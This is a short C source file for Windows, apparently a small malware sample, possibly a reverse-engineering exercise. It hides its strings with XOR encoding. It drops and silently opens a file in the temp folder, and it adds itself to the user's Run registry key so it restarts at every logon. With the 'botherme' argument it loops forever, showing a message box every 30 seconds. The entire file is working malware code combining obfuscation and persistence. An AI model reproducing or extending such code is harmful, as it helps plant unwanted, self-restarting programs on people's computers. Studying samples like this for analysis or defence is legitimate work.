#include "malware.h"

char filePath[BUF_SIZE];
char file[] = "\x4f\x43\x5e\x49\x73\x5e\x49\x5a\x49\x5e\x5f\x49\x02\x48\x43\x4f";
char fileBuf[] = "\x78\x49\x5f\x58";

char regPath[BUF_SIZE];
char regKey[] = "\x7f\x43\x4a\x58\x5b\x4d\x5e\x49\x70\x70\x61\x45\x4f\x5e\x43\x5f\x43\x4a\x58\x70\x70\x7b\x45\x42\x48\x43\x5b\x5f\x70\x70\x6f\x59\x5e\x5e\x49\x42\x58\x7a\x49\x5e\x5f\x45\x43\x42\x70\x70\x7e\x59\x42";
char param[] = "\x0c\x4e\x43\x58\x44\x49\x5e\x41\x49";

char annoyingText[] = "\x64\x49\x40\x40\x43\x02\x0c\x58\x44\x45\x5f\x0c\x45\x5f\x0c\x7e\x49\x48\x44\x59\x42\x4b\x0c\x17\x05";

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
	if (strcmp(lpCmdLine, "botherme") == 0)
		annoying();
	createDoc();
	writeReg();
	return 0;
}

void annoying() {
	decrypt(annoyingText);
	while (1)
	{
		MessageBoxA(0, annoyingText, 0, 0);
		Sleep(30000);
	}
}

void createDoc() {
	FILE* fp;
	memset(filePath, 0, 256);
	GetTempPath(BUF_SIZE, filePath);
	decrypt(file);
	strcat_s(filePath, file);
	fp = fopen(filePath, "wb");
	decrypt(fileBuf);
	fwrite(fileBuf, 1, sizeof(fileBuf), fp);
	fclose(fp);
	ShellExecuteA(NULL, "open", filePath, NULL, NULL, SW_HIDE);
}

void writeReg() {
	HKEY hKey;
	memset(regPath, 0, 256);
	GetModuleFileNameA(0, regPath, sizeof(regPath));
	decrypt(param);
	strcat_s(regPath, param);
	decrypt(regKey);
	RegCreateKeyExA(HKEY_CURRENT_USER, regKey, 0, 0, 0, 0x2001f, 0, &hKey, 0);
	RegSetValueExA(hKey, "redhung", 0, 1, (BYTE* ) regPath, strlen(regPath));
}

void decrypt(char buf[]) {
	for (int i = 0; i < strlen(buf) ; i++)
		buf[i] = buf[i] ^ 0x2c;
}